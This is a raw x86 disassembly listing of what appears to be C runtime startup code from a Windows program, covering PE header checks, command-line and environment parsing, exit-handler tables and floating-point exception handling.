  424499:	mov    DWORD PTR ds:0x45dad4,edx
  42449f:	mov    esi,DWORD PTR [esi+0xc]
  4244a2:	and    esi,0x7fff
  4244a8:	mov    DWORD PTR ds:0x45dac8,esi
  4244ae:	cmp    ecx,0x2
  4244b1:	je     0x4244bf
  4244b3:	or     esi,0x8000
  4244b9:	mov    DWORD PTR ds:0x45dac8,esi
  4244bf:	shl    eax,0x8
  4244c2:	add    eax,edx
  4244c4:	mov    ds:0x45dacc,eax
  4244c9:	xor    esi,esi
  4244cb:	push   esi
  4244cc:	mov    edi,DWORD PTR ds:0x429024
  4244d2:	call   edi
  4244d4:	cmp    WORD PTR [eax],0x5a4d
  4244d9:	jne    0x4244fa
  4244db:	mov    ecx,DWORD PTR [eax+0x3c]
  4244de:	add    ecx,eax
  4244e0:	cmp    DWORD PTR [ecx],0x4550
  4244e6:	jne    0x4244fa
  4244e8:	movzx  eax,WORD PTR [ecx+0x18]
  4244ec:	cmp    eax,0x10b
  4244f1:	je     0x424512
  4244f3:	cmp    eax,0x20b
  4244f8:	je     0x4244ff
  4244fa:	mov    DWORD PTR [ebp-0x1c],esi
  4244fd:	jmp    0x424526
  4244ff:	cmp    DWORD PTR [ecx+0x84],0xe
  424506:	jbe    0x4244fa
  424508:	xor    eax,eax
  42450a:	cmp    DWORD PTR [ecx+0xf8],esi
  424510:	jmp    0x424520
  424512:	cmp    DWORD PTR [ecx+0x74],0xe
  424516:	jbe    0x4244fa
  424518:	xor    eax,eax
  42451a:	cmp    DWORD PTR [ecx+0xe8],esi
  424520:	setne  al
  424523:	mov    DWORD PTR [ebp-0x1c],eax
  424526:	push   0x1
  424528:	call   0x4252fd
  42452d:	pop    ecx
  42452e:	test   eax,eax
  424530:	jne    0x42453a
  424532:	push   0x1c
  424534:	call   0x42443b
  424539:	pop    ecx
  42453a:	call   0x425274
  42453f:	test   eax,eax
  424541:	jne    0x42454b
  424543:	push   0x10
  424545:	call   0x42443b
  42454a:	pop    ecx
  42454b:	call   0x42515d
  424550:	mov    DWORD PTR [ebp-0x4],esi
  424553:	call   0x424f5f
  424558:	test   eax,eax
  42455a:	jge    0x424564
  42455c:	push   0x1b
  42455e:	call   0x424416
  424563:	pop    ecx
  424564:	call   DWORD PTR ds:0x429054
  42456a:	mov    ds:0x45e274,eax
  42456f:	call   0x424e3d
  424574:	mov    ds:0x45dab4,eax
  424579:	call   0x424d9b
  42457e:	test   eax,eax
  424580:	jge    0x42458a
  424582:	push   0x8
  424584:	call   0x424416
  424589:	pop    ecx
  42458a:	call   0x424b68
  42458f:	test   eax,eax
  424591:	jge    0x42459b
  424593:	push   0x9
  424595:	call   0x424416
  42459a:	pop    ecx
  42459b:	call   0x424673
  4245a0:	mov    DWORD PTR [ebp-0x20],eax
  4245a3:	cmp    eax,esi
  4245a5:	je     0x4245ae
  4245a7:	push   eax
  4245a8:	call   0x424416
  4245ad:	pop    ecx
  4245ae:	mov    DWORD PTR [ebp-0x38],esi
  4245b1:	lea    eax,[ebp-0x64]
  4245b4:	push   eax
  4245b5:	call   DWORD PTR ds:0x429050
  4245bb:	call   0x424aff
  4245c0:	mov    DWORD PTR [ebp-0x68],eax
  4245c3:	test   BYTE PTR [ebp-0x38],0x1
  4245c7:	je     0x4245cf
  4245c9:	movzx  eax,WORD PTR [ebp-0x34]
  4245cd:	jmp    0x4245d2
  4245cf:	push   0xa
  4245d1:	pop    eax
  4245d2:	push   eax
  4245d3:	push   DWORD PTR [ebp-0x68]
  4245d6:	push   esi
  4245d7:	push   esi
  4245d8:	call   edi
  4245da:	push   eax
  4245db:	call   0x422f90
  4245e0:	mov    edi,eax
  4245e2:	mov    DWORD PTR [ebp-0x6c],edi
  4245e5:	cmp    DWORD PTR [ebp-0x1c],esi
  4245e8:	jne    0x4245f0
  4245ea:	push   edi
  4245eb:	call   0x4247ab
  4245f0:	call   0x4247cd
  4245f5:	jmp    0x424622
  4245f7:	mov    eax,DWORD PTR [ebp-0x14]
  4245fa:	mov    ecx,DWORD PTR [eax]
  4245fc:	mov    ecx,DWORD PTR [ecx]
  4245fe:	mov    DWORD PTR [ebp-0x70],ecx
  424601:	push   eax
  424602:	push   ecx
  424603:	call   0x42499b
  424608:	pop    ecx
  424609:	pop    ecx
  42460a:	ret    
  42460b:	mov    esp,DWORD PTR [ebp-0x18]
  42460e:	mov    edi,DWORD PTR [ebp-0x70]
  424611:	cmp    DWORD PTR [ebp-0x1c],0x0
  424615:	jne    0x42461d
  424617:	push   edi
  424618:	call   0x4247bc
  42461d:	call   0x4247dc
  424622:	or     DWORD PTR [ebp-0x4],0xffffffff
  424626:	mov    eax,edi
  424628:	lea    esp,[ebp-0x7c]
  42462b:	call   0x42538b
  424630:	ret    
  424631:	push   0x429244
  424636:	call   DWORD PTR ds:0x429024
  42463c:	test   eax,eax
  42463e:	je     0x424656
  424640:	push   0x429234
  424645:	push   eax
  424646:	call   DWORD PTR ds:0x429020
  42464c:	test   eax,eax
  42464e:	je     0x424656
  424650:	push   DWORD PTR [esp+0x4]
  424654:	call   eax
  424656:	push   DWORD PTR [esp+0x4]
  42465a:	call   DWORD PTR ds:0x42905c
  424660:	int3   
  424661:	push   0x8
  424663:	call   0x42550f
  424668:	pop    ecx
  424669:	ret    
  42466a:	push   0x8
  42466c:	call   0x42547b
  424671:	pop    ecx
  424672:	ret    
  424673:	mov    eax,ds:0x45e270
  424678:	test   eax,eax
  42467a:	je     0x42467e
  42467c:	call   eax
  42467e:	push   esi
  42467f:	push   edi
  424680:	mov    ecx,0x42b00c
  424685:	mov    edi,0x42b018
  42468a:	xor    eax,eax
  42468c:	cmp    ecx,edi
  42468e:	mov    esi,ecx
  424690:	jae    0x4246a9
  424692:	test   eax,eax
  424694:	jne    0x4246d5
  424696:	mov    ecx,DWORD PTR [esi]
  424698:	test   ecx,ecx
  42469a:	je     0x42469e
  42469c:	call   ecx
  42469e:	add    esi,0x4
  4246a1:	cmp    esi,edi
  4246a3:	jb     0x424692
  4246a5:	test   eax,eax
  4246a7:	jne    0x4246d5
  4246a9:	push   0x4251a1
  4246ae:	call   0x425620
  4246b3:	mov    esi,0x42b000
  4246b8:	mov    eax,esi
  4246ba:	mov    edi,0x42b008
  4246bf:	cmp    eax,edi
  4246c1:	pop    ecx
  4246c2:	jae    0x4246d3
  4246c4:	mov    eax,DWORD PTR [esi]
  4246c6:	test   eax,eax
  4246c8:	je     0x4246cc
  4246ca:	call   eax
  4246cc:	add    esi,0x4
  4246cf:	cmp    esi,edi
  4246d1:	jb     0x4246c4
  4246d3:	xor    eax,eax
  4246d5:	pop    edi
  4246d6:	pop    esi
  4246d7:	ret    
  4246d8:	push   ebp
  4246d9:	mov    ebp,esp
  4246db:	push   esi
  4246dc:	push   edi
  4246dd:	push   0x8
  4246df:	call   0x42550f
  4246e4:	xor    esi,esi
  4246e6:	inc    esi
  4246e7:	cmp    DWORD PTR ds:0x45db04,esi
  4246ed:	pop    ecx
  4246ee:	jne    0x424700
  4246f0:	push   DWORD PTR [ebp+0x8]
  4246f3:	call   DWORD PTR ds:0x429064
  4246f9:	push   eax
  4246fa:	call   DWORD PTR ds:0x429060
  424700:	cmp    DWORD PTR [ebp+0xc],0x0
  424704:	mov    al,BYTE PTR [ebp+0x10]
  424707:	mov    DWORD PTR ds:0x45db00,esi
  42470d:	mov    ds:0x45dafc,al
  424712:	jne    0x424766
  424714:	mov    ecx,DWORD PTR ds:0x45e268
  42471a:	test   ecx,ecx
  42471c:	je     0x424747
  42471e:	mov    eax,ds:0x45e264
  424723:	sub    eax,0x4
  424726:	cmp    eax,ecx
  424728:	jmp    0x424740
  42472a:	mov    eax,DWORD PTR [eax]
  42472c:	test   eax,eax
  42472e:	je     0x424732
  424730:	call   eax
  424732:	mov    eax,ds:0x45e264
  424737:	sub    eax,0x4
  42473a:	cmp    eax,DWORD PTR ds:0x45e268
  424740:	mov    ds:0x45e264,eax
  424745:	jae    0x42472a
  424747:	mov    eax,0x42b01c
  42474c:	mov    esi,0x42b020
  424751:	cmp    eax,esi
  424753:	mov    edi,eax
  424755:	jae    0x424766
  424757:	mov    eax,DWORD PTR [edi]
  424759:	test   eax,eax
  42475b:	je     0x42475f
  42475d:	call   eax
  42475f:	add    edi,0x4
  424762:	cmp    edi,esi
  424764:	jb     0x424757
  424766:	mov    eax,0x42b024
  42476b:	mov    esi,0x42b028
  424770:	cmp    eax,esi
  424772:	mov    edi,eax
  424774:	jae    0x424785
  424776:	mov    eax,DWORD PTR [edi]
  424778:	test   eax,eax
  42477a:	je     0x42477e
  42477c:	call   eax
  42477e:	add    edi,0x4
  424781:	cmp    edi,esi
  424783:	jb     0x424776
  424785:	cmp    DWORD PTR [ebp+0x10],0x0
  424789:	pop    edi
  42478a:	pop    esi
  42478b:	je     0x424796
  42478d:	push   0x8
  42478f:	call   0x42547b
  424794:	jmp    0x4247a8
  424796:	push   DWORD PTR [ebp+0x8]
  424799:	mov    DWORD PTR ds:0x45db04,0x1
  4247a3:	call   0x424631
  4247a8:	pop    ecx
  4247a9:	pop    ebp
  4247aa:	ret    
  4247ab:	push   0x0
  4247ad:	push   0x0
  4247af:	push   DWORD PTR [esp+0xc]
  4247b3:	call   0x4246d8
  4247b8:	add    esp,0xc
  4247bb:	ret    
  4247bc:	push   0x0
  4247be:	push   0x1
  4247c0:	push   DWORD PTR [esp+0xc]
  4247c4:	call   0x4246d8
  4247c9:	add    esp,0xc
  4247cc:	ret    
  4247cd:	push   0x1
  4247cf:	push   0x0
  4247d1:	push   0x0
  4247d3:	call   0x4246d8
  4247d8:	add    esp,0xc
  4247db:	ret    
  4247dc:	push   0x1
  4247de:	push   0x1
  4247e0:	push   0x0
  4247e2:	call   0x4246d8
  4247e7:	add    esp,0xc
  4247ea:	ret    
  4247eb:	push   ebp
  4247ec:	mov    ebp,esp
  4247ee:	sub    esp,0x10c
  4247f4:	mov    eax,ds:0x45d430
  4247f9:	xor    eax,DWORD PTR [ebp+0x4]
  4247fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4247ff:	push   ebx
  424800:	push   esi
  424801:	mov    DWORD PTR [ebp-0x4],eax
  424804:	xor    edx,edx
  424806:	push   edi
  424807:	xor    eax,eax
  424809:	cmp    ecx,DWORD PTR [eax*8+0x45d1c8]
  424810:	je     0x424818
  424812:	inc    eax
  424813:	cmp    eax,0x12
  424816:	jb     0x424809
  424818:	mov    esi,eax
  42481a:	shl    esi,0x3
  42481d:	cmp    ecx,DWORD PTR [esi+0x45d1c8]
  424823:	jne    0x42494c
  424829:	mov    eax,ds:0x45dabc
  42482e:	cmp    eax,0x1
  424831:	je     0x424927
  424837:	cmp    eax,edx
  424839:	jne    0x424848
  42483b:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424842:	je     0x424927
  424848:	cmp    ecx,0xfc
  42484e:	je     0x42494c
  424854:	push   0x104
  424859:	lea    eax,[ebp-0x10c]
  42485f:	push   eax
  424860:	push   edx
  424861:	mov    BYTE PTR [ebp-0x8],dl
  424864:	call   DWORD PTR ds:0x42906c
  42486a:	test   eax,eax
  42486c:	jne    0x424881
  42486e:	lea    eax,[ebp-0x10c]
  424874:	push   0x42959c
  424879:	push   eax
  42487a:	call   0x425730
  42487f:	pop    ecx
  424880:	pop    ecx
  424881:	lea    eax,[ebp-0x10c]
  424887:	push   eax
  424888:	lea    edi,[ebp-0x10c]
  42488e:	call   0x425960
  424893:	inc    eax
  424894:	cmp    eax,0x3c
  424897:	pop    ecx
  424898:	jbe    0x4248c3
  42489a:	lea    eax,[ebp-0x10c]
  4248a0:	push   eax
  4248a1:	call   0x425960
  4248a6:	mov    edi,eax
  4248a8:	lea    eax,[ebp-0x10c]
  4248ae:	sub    eax,0x3b
  4248b1:	push   0x3
  4248b3:	add    edi,eax
  4248b5:	push   0x429598
  4248ba:	push   edi
  4248bb:	call   0x425830
  4248c0:	add    esp,0x10
  4248c3:	push   edi
  4248c4:	call   0x425960
  4248c9:	push   DWORD PTR [esi+0x45d1cc]
  4248cf:	mov    ebx,eax
  4248d1:	call   0x425960
  4248d6:	lea    eax,[ebx+eax*1+0x1c]
  4248da:	pop    ecx
  4248db:	add    eax,0x3
  4248de:	pop    ecx
  4248df:	and    eax,0xfffffffc
  4248e2:	call   0x4253a0
  4248e7:	mov    ebx,esp
  4248e9:	push   0x42957c
  4248ee:	push   ebx
  4248ef:	call   0x425730
  4248f4:	push   edi
  4248f5:	push   ebx
  4248f6:	call   0x425740
  4248fb:	push   0x429578
  424900:	push   ebx
  424901:	call   0x425740
  424906:	push   DWORD PTR [esi+0x45d1cc]
  42490c:	push   ebx
  42490d:	call   0x425740
  424912:	push   0x12010
  424917:	push   0x429550
  42491c:	push   ebx
  42491d:	call   0x425632
  424922:	add    esp,0x2c
  424925:	jmp    0x42494c
  424927:	push   edx
  424928:	lea    eax,[ebp+0x8]
  42492b:	push   eax
  42492c:	lea    esi,[esi+0x45d1cc]
  424932:	push   DWORD PTR [esi]
  424934:	call   0x425960
  424939:	pop    ecx
  42493a:	push   eax
  42493b:	push   DWORD PTR [esi]
  42493d:	push   0xfffffff4
  42493f:	call   DWORD PTR ds:0x429068
  424945:	push   eax
  424946:	call   DWORD PTR ds:0x42902c
  42494c:	lea    esp,[ebp-0x118]
  424952:	mov    ecx,DWORD PTR [ebp-0x4]
  424955:	xor    ecx,DWORD PTR [ebp+0x4]
  424958:	call   0x425a1c
  42495d:	pop    edi
  42495e:	pop    esi
  42495f:	pop    ebx
  424960:	leave  
  424961:	ret    
  424962:	mov    eax,ds:0x45dabc
  424967:	cmp    eax,0x1
  42496a:	je     0x424979
  42496c:	test   eax,eax
  42496e:	jne    0x42499a
  424970:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424977:	jne    0x42499a
  424979:	push   0xfc
  42497e:	call   0x4247eb
  424983:	mov    eax,ds:0x45db08
  424988:	test   eax,eax
  42498a:	pop    ecx
  42498b:	je     0x42498f
  42498d:	call   eax
  42498f:	push   0xff
  424994:	call   0x4247eb
  424999:	pop    ecx
  42499a:	ret    
  42499b:	push   ebp
  42499c:	mov    ebp,esp
  42499e:	push   ecx
  42499f:	push   ebx
  4249a0:	push   esi
  4249a1:	push   edi
  4249a2:	call   0x425203
  4249a7:	mov    edi,DWORD PTR [ebp+0x8]
  4249aa:	mov    esi,eax
  4249ac:	mov    edx,DWORD PTR [esi+0x54]
  4249af:	mov    eax,ds:0x45d2dc
  4249b4:	mov    ecx,edx
  4249b6:	cmp    DWORD PTR [ecx],edi
  4249b8:	je     0x4249c7
  4249ba:	lea    ebx,[eax+eax*2]
  4249bd:	add    ecx,0xc
  4249c0:	lea    ebx,[edx+ebx*4]
  4249c3:	cmp    ecx,ebx
  4249c5:	jb     0x4249b6
  4249c7:	lea    eax,[eax+eax*2]
  4249ca:	lea    eax,[edx+eax*4]
  4249cd:	cmp    ecx,eax
  4249cf:	jae    0x4249d5
  4249d1:	cmp    DWORD PTR [ecx],edi
  4249d3:	je     0x4249d7
  4249d5:	xor    ecx,ecx
  4249d7:	test   ecx,ecx
  4249d9:	je     0x424af1
  4249df:	mov    ebx,DWORD PTR [ecx+0x8]
  4249e2:	test   ebx,ebx
  4249e4:	mov    DWORD PTR [ebp+0x8],ebx
  4249e7:	je     0x424af1
  4249ed:	cmp    ebx,0x5
  4249f0:	jne    0x4249fe
  4249f2:	and    DWORD PTR [ecx+0x8],0x0
  4249f6:	xor    eax,eax
  4249f8:	inc    eax
  4249f9:	jmp    0x424afa
  4249fe:	cmp    ebx,0x1
  424a01:	je     0x424aec
  424a07:	mov    eax,DWORD PTR [esi+0x58]
  424a0a:	mov    DWORD PTR [ebp-0x4],eax
  424a0d:	mov    eax,DWORD PTR [ebp+0xc]
  424a10:	mov    DWORD PTR [esi+0x58],eax
  424a13:	mov    eax,DWORD PTR [ecx+0x4]
  424a16:	cmp    eax,0x8
  424a19:	jne    0x424ade
  424a1f:	mov    edx,DWORD PTR ds:0x45d2d0
  424a25:	mov    eax,ds:0x45d2d4
  424a2a:	add    eax,edx
  424a2c:	cmp    edx,eax
  424a2e:	jge    0x424a57
  424a30:	lea    eax,[edx+edx*2]
  424a33:	shl    eax,0x2
  424a36:	mov    edi,DWORD PTR [esi+0x54]
  424a39:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424a3e:	mov    edi,DWORD PTR ds:0x45d2d0
  424a44:	mov    ebx,DWORD PTR ds:0x45d2d4
  424a4a:	inc    edx
  424a4b:	add    ebx,edi
  424a4d:	add    eax,0xc
  424a50:	cmp    edx,ebx
  424a52:	jl     0x424a36
  424a54:	mov    ebx,DWORD PTR [ebp+0x8]
  424a57:	mov    ecx,DWORD PTR [ecx]
  424a59:	cmp    ecx,0xc000008e
  424a5f:	mov    edi,DWORD PTR [esi+0x5c]
  424a62:	jne    0x424a6d
  424a64:	mov    DWORD PTR [esi+0x5c],0x83
  424a6b:	jmp    0x424ad1
  424a6d:	cmp    ecx,0xc0000090
  424a73:	jne    0x424a7e
  424a75:	mov    DWORD PTR [esi+0x5c],0x81
  424a7c:	jmp    0x424ad1
  424a7e:	cmp    ecx,0xc0000091
  424a84:	jne    0x424a8f
  424a86:	mov    DWORD PTR [esi+0x5c],0x84
  424a8d:	jmp    0x424ad1
  424a8f:	cmp    ecx,0xc0000093
  424a95:	jne    0x424aa0
  424a97:	mov    DWORD PTR [esi+0x5c],0x85
  424a9e:	jmp    0x424ad1
  424aa0:	cmp    ecx,0xc000008d
  424aa6:	jne    0x424ab1
  424aa8:	mov    DWORD PTR [esi+0x5c],0x82
  424aaf:	jmp    0x424ad1
  424ab1:	cmp    ecx,0xc000008f
  424ab7:	jne    0x424ac2
  424ab9:	mov    DWORD PTR [esi+0x5c],0x86
  424ac0:	jmp    0x424ad1
  424ac2:	cmp    ecx,0xc0000092
  424ac8:	jne    0x424ad1
  424aca:	mov    DWORD PTR [esi+0x5c],0x8a
  424ad1:	push   DWORD PTR [esi+0x5c]
  424ad4:	push   0x8
  424ad6:	call   ebx
  424ad8:	pop    ecx
  424ad9:	mov    DWORD PTR [esi+0x5c],edi
  424adc:	jmp    0x424ae5
  424ade:	and    DWORD PTR [ecx+0x8],0x0
  424ae2:	push   eax
  424ae3:	call   ebx
  424ae5:	mov    eax,DWORD PTR [ebp-0x4]
  424ae8:	pop    ecx
  424ae9:	mov    DWORD PTR [esi+0x58],eax
  424aec:	or     eax,0xffffffff
  424aef:	jmp    0x424afa
  424af1:	push   DWORD PTR [ebp+0xc]
  424af4:	call   DWORD PTR ds:0x429070
  424afa:	pop    edi
  424afb:	pop    esi
  424afc:	pop    ebx
  424afd:	leave  
  424afe:	ret    
  424aff:	cmp    DWORD PTR ds:0x45e26c,0x0
  424b06:	jne    0x424b0d
  424b08:	call   0x425f3c
  424b0d:	push   esi
  424b0e:	mov    esi,DWORD PTR ds:0x45e274
  424b14:	test   esi,esi
  424b16:	jne    0x424b1f
  424b18:	mov    esi,0x4295b3
  424b1d:	jmp    0x424b64
  424b1f:	mov    al,BYTE PTR [esi]
  424b21:	cmp    al,0x22
  424b23:	jne    0x424b4d
  424b25:	inc    esi
  424b26:	mov    al,BYTE PTR [esi]
  424b28:	cmp    al,0x22
  424b2a:	je     0x424b5d
  424b2c:	test   al,al
  424b2e:	je     0x424b46
  424b30:	movzx  eax,al
  424b33:	push   eax
  424b34:	call   0x425a5b
  424b39:	test   eax,eax
  424b3b:	pop    ecx
  424b3c:	je     0x424b3f
  424b3e:	inc    esi
  424b3f:	inc    esi
  424b40:	mov    al,BYTE PTR [esi]
  424b42:	cmp    al,0x22
  424b44:	jne    0x424b2c
  424b46:	cmp    BYTE PTR [esi],0x22
  424b49:	jne    0x424b5e
  424b4b:	jmp    0x424b5d
  424b4d:	cmp    al,0x20
  424b4f:	jbe    0x424b5e
  424b51:	inc    esi
  424b52:	cmp    BYTE PTR [esi],0x20
  424b55:	ja     0x424b51
  424b57:	jmp    0x424b5e
  424b59:	cmp    al,0x20
  424b5b:	ja     0x424b64
  424b5d:	inc    esi
  424b5e:	mov    al,BYTE PTR [esi]
  424b60:	test   al,al
  424b62:	jne    0x424b59
  424b64:	mov    eax,esi
  424b66:	pop    esi
  424b67:	ret    
  424b68:	push   ebx
  424b69:	xor    ebx,ebx
  424b6b:	cmp    DWORD PTR ds:0x45e26c,ebx
  424b71:	push   esi
  424b72:	push   edi
  424b73:	jne    0x424b7a
  424b75:	call   0x425f3c
  424b7a:	mov    esi,DWORD PTR ds:0x45dab4
  424b80:	xor    edi,edi
  424b82:	cmp    esi,ebx
  424b84:	jne    0x424b98
  424b86:	jmp    0x424bb8
  424b88:	cmp    al,0x3d
  424b8a:	je     0x424b8d
  424b8c:	inc    edi
  424b8d:	push   esi
  424b8e:	call   0x425960
  424b93:	pop    ecx
  424b94:	lea    esi,[esi+eax*1+0x1]
  424b98:	mov    al,BYTE PTR [esi]
  424b9a:	cmp    al,bl
  424b9c:	jne    0x424b88
  424b9e:	lea    eax,[edi*4+0x4]
  424ba5:	push   eax
  424ba6:	call   0x426072
  424bab:	mov    edi,eax
  424bad:	cmp    edi,ebx
  424baf:	pop    ecx
  424bb0:	mov    DWORD PTR ds:0x45dae4,edi
  424bb6:	jne    0x424bbd
  424bb8:	or     eax,0xffffffff
  424bbb:	jmp    0x424c15
  424bbd:	mov    esi,DWORD PTR ds:0x45dab4
  424bc3:	push   ebp
  424bc4:	jmp    0x424bf0
  424bc6:	push   esi
  424bc7:	call   0x425960
  424bcc:	mov    ebp,eax
  424bce:	inc    ebp
  424bcf:	cmp    BYTE PTR [esi],0x3d
  424bd2:	pop    ecx
  424bd3:	je     0x424bee
  424bd5:	push   ebp
  424bd6:	call   0x426072
  424bdb:	cmp    eax,ebx
  424bdd:	pop    ecx
  424bde:	mov    DWORD PTR [edi],eax
  424be0:	je     0x424c19
  424be2:	push   esi
  424be3:	push   eax
  424be4:	call   0x425730
  424be9:	pop    ecx
  424bea:	pop    ecx
  424beb:	add    edi,0x4
  424bee:	add    esi,ebp
  424bf0:	cmp    BYTE PTR [esi],bl
  424bf2:	jne    0x424bc6
  424bf4:	push   DWORD PTR ds:0x45dab4
  424bfa:	call   0x425f5a
  424bff:	mov    DWORD PTR ds:0x45dab4,ebx
  424c05:	mov    DWORD PTR [edi],ebx
  424c07:	mov    DWORD PTR ds:0x45e260,0x1
  424c11:	xor    eax,eax
  424c13:	pop    ecx
  424c14:	pop    ebp
  424c15:	pop    edi
  424c16:	pop    esi
  424c17:	pop    ebx
  424c18:	ret    
  424c19:	push   DWORD PTR ds:0x45dae4
  424c1f:	call   0x425f5a
  424c24:	mov    DWORD PTR ds:0x45dae4,ebx
  424c2a:	or     eax,0xffffffff
  424c2d:	jmp    0x424c13
  424c2f:	push   ebp
  424c30:	mov    ebp,esp
  424c32:	push   ecx
  424c33:	push   ebx
  424c34:	mov    ebx,DWORD PTR [ebp+0xc]
  424c37:	xor    edx,edx
  424c39:	cmp    DWORD PTR [ebp+0x8],edx
  424c3c:	push   edi
  424c3d:	mov    DWORD PTR [esi],edx
  424c3f:	mov    edi,ecx
  424c41:	mov    DWORD PTR [ebx],0x1
  424c47:	je     0x424c52
  424c49:	mov    ecx,DWORD PTR [ebp+0x8]
  424c4c:	add    DWORD PTR [ebp+0x8],0x4
  424c50:	mov    DWORD PTR [ecx],edi
  424c52:	cmp    BYTE PTR [eax],0x22
  424c55:	jne    0x424c65
  424c57:	xor    ecx,ecx
  424c59:	test   edx,edx
  424c5b:	sete   cl
  424c5e:	inc    eax
  424c5f:	mov    edx,ecx
  424c61:	mov    cl,0x22
  424c63:	jmp    0x424c92
  424c65:	inc    DWORD PTR [esi]
  424c67:	test   edi,edi
  424c69:	je     0x424c70
  424c6b:	mov    cl,BYTE PTR [eax]
  424c6d:	mov    BYTE PTR [edi],cl
  424c6f:	inc    edi
  424c70:	mov    cl,BYTE PTR [eax]
  424c72:	movzx  ebx,cl
  424c75:	inc    eax
  424c76:	test   BYTE PTR [ebx+0x45df21],0x4
  424c7d:	je     0x424c8b
  424c7f:	inc    DWORD PTR [esi]
  424c81:	test   edi,edi
  424c83:	je     0x424c8a
  424c85:	mov    bl,BYTE PTR [eax]
  424c87:	mov    BYTE PTR [edi],bl
  424c89:	inc    edi
  424c8a:	inc    eax
  424c8b:	test   cl,cl
  424c8d:	mov    ebx,DWORD PTR [ebp+0xc]
  424c90:	je     0x424cc4
  424c92:	test   edx,edx
  424c94:	jne    0x424c52
  424c96:	cmp    cl,0x20
  424c99:	je     0x424ca0
  424c9b:	cmp    cl,0x9
  424c9e:	jne    0x424c52
  424ca0:	test   edi,edi
  424ca2:	je     0x424ca8
  424ca4:	and    BYTE PTR [edi-0x1],0x0
  424ca8:	and    DWORD PTR [ebp-0x4],0x0
  424cac:	cmp    BYTE PTR [eax],0x0
  424caf:	je     0x424d8b
  424cb5:	mov    cl,BYTE PTR [eax]
  424cb7:	cmp    cl,0x20
  424cba:	je     0x424cc1
  424cbc:	cmp    cl,0x9
  424cbf:	jne    0x424cc7
  424cc1:	inc    eax
  424cc2:	jmp    0x424cb5
  424cc4:	dec    eax
  424cc5:	jmp    0x424ca8
  424cc7:	cmp    BYTE PTR [eax],0x0
  424cca:	je     0x424d8b
  424cd0:	cmp    DWORD PTR [ebp+0x8],0x0
  424cd4:	je     0x424cdf
  424cd6:	mov    ecx,DWORD PTR [ebp+0x8]
  424cd9:	add    DWORD PTR [ebp+0x8],0x4
  424cdd:	mov    DWORD PTR [ecx],edi
  424cdf:	inc    DWORD PTR [ebx]
  424ce1:	xor    ebx,ebx
  424ce3:	inc    ebx
  424ce4:	xor    edx,edx
  424ce6:	jmp    0x424cea
  424ce8:	inc    eax
  424ce9:	inc    edx
  424cea:	cmp    BYTE PTR [eax],0x5c
  424ced:	je     0x424ce8
  424cef:	cmp    BYTE PTR [eax],0x22
  424cf2:	jne    0x424d1a
  424cf4:	test   dl,0x1
  424cf7:	jne    0x424d18
  424cf9:	cmp    DWORD PTR [ebp-0x4],0x0
  424cfd:	je     0x424d0b
  424cff:	lea    ecx,[eax+0x1]
  424d02:	cmp    BYTE PTR [ecx],0x22
  424d05:	jne    0x424d0b
  424d07:	mov    eax,ecx
  424d09:	jmp    0x424d0d
  424d0b:	xor    ebx,ebx
  424d0d:	xor    ecx,ecx
  424d0f:	cmp    DWORD PTR [ebp-0x4],ecx
  424d12:	sete   cl
  424d15:	mov    DWORD PTR [ebp-0x4],ecx
  424d18:	shr    edx,1
  424d1a:	test   edx,edx
  424d1c:	je     0x424d2b
  424d1e:	test   edi,edi
  424d20:	je     0x424d26
  424d22:	mov    BYTE PTR [edi],0x5c
  424d25:	inc    edi
  424d26:	inc    DWORD PTR [esi]
  424d28:	dec    edx
  424d29:	jne    0x424d1e
  424d2b:	mov    cl,BYTE PTR [eax]
  424d2d:	test   cl,cl
  424d2f:	je     0x424d79
  424d31:	cmp    DWORD PTR [ebp-0x4],0x0
  424d35:	jne    0x424d41
  424d37:	cmp    cl,0x20
  424d3a:	je     0x424d79
  424d3c:	cmp    cl,0x9
  424d3f:	je     0x424d79
  424d41:	test   ebx,ebx
  424d43:	je     0x424d73
  424d45:	test   edi,edi
  424d47:	je     0x424d62
  424d49:	movzx  edx,cl
  424d4c:	test   BYTE PTR [edx+0x45df21],0x4
  424d53:	je     0x424d5b
  424d55:	mov    BYTE PTR [edi],cl
  424d57:	inc    edi
  424d58:	inc    eax
  424d59:	inc    DWORD PTR [esi]
  424d5b:	mov    cl,BYTE PTR [eax]
  424d5d:	mov    BYTE PTR [edi],cl
  424d5f:	inc    edi
  424d60:	jmp    0x424d71
  424d62:	movzx  ecx,cl
  424d65:	test   BYTE PTR [ecx+0x45df21],0x4
  424d6c:	je     0x424d71
  424d6e:	inc    eax
  424d6f:	inc    DWORD PTR [esi]
  424d71:	inc    DWORD PTR [esi]
  424d73:	inc    eax
  424d74:	jmp    0x424ce1
  424d79:	test   edi,edi
  424d7b:	je     0x424d81
  424d7d:	and    BYTE PTR [edi],0x0
  424d80:	inc    edi
  424d81:	inc    DWORD PTR [esi]
  424d83:	mov    ebx,DWORD PTR [ebp+0xc]
  424d86:	jmp    0x424cac
  424d8b:	mov    eax,DWORD PTR [ebp+0x8]
  424d8e:	test   eax,eax
  424d90:	je     0x424d95
  424d92:	and    DWORD PTR [eax],0x0
  424d95:	inc    DWORD PTR [ebx]
  424d97:	pop    edi
  424d98:	pop    ebx
  424d99:	leave  
  424d9a:	ret    
  424d9b:	push   ebp
  424d9c:	mov    ebp,esp
  424d9e:	push   ecx
  424d9f:	push   ecx
  424da0:	push   ebx
  424da1:	push   esi
  424da2:	push   edi
  424da3:	xor    edi,edi
  424da5:	cmp    DWORD PTR ds:0x45e26c,edi
  424dab:	jne    0x424db2
  424dad:	call   0x425f3c
  424db2:	and    BYTE PTR ds:0x45dc14,0x0
  424db9:	push   0x104
  424dbe:	mov    esi,0x45db10
  424dc3:	push   esi
  424dc4:	push   edi
  424dc5:	call   DWORD PTR ds:0x42906c
  424dcb:	mov    eax,ds:0x45e274
  424dd0:	cmp    eax,edi
  424dd2:	mov    DWORD PTR ds:0x45daf4,esi
  424dd8:	je     0x424de1
  424dda:	cmp    BYTE PTR [eax],0x0
  424ddd:	mov    ebx,eax
  424ddf:	jne    0x424de3
  424de1:	mov    ebx,esi
  424de3:	lea    eax,[ebp-0x4]
  424de6:	push   eax
  424de7:	push   edi
  424de8:	lea    esi,[ebp-0x8]
  424deb:	xor    ecx,ecx
  424ded:	mov    eax,ebx
  424def:	call   0x424c2f
  424df4:	mov    esi,DWORD PTR [ebp-0x4]
  424df7:	mov    eax,DWORD PTR [ebp-0x8]
  424dfa:	shl    esi,0x2
  424dfd:	add    eax,esi
  424dff:	push   eax
